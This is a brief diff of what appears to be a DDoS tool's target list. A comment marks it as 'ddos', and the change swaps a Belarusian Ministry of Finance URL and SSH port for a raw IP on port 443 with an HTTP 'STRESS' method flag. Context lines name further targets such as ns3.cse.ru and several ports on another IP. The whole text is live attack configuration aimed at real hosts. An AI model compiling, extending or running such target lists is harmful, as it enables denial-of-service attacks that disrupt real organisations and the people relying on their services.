@@ -51,7 +51,7 @@ ns3.cse.ru tcp://185.65.21.153:22 tcp://185.65.21.153:53 tcp://185.65.21.153:200
 
 #ddos separiv
 
-https://www.minfin.gov.by tcp://195.50.4.142:22 
+https://195.50.4.54 tcp://195.50.4.54:443 --http-methods STRESS
 
  
 
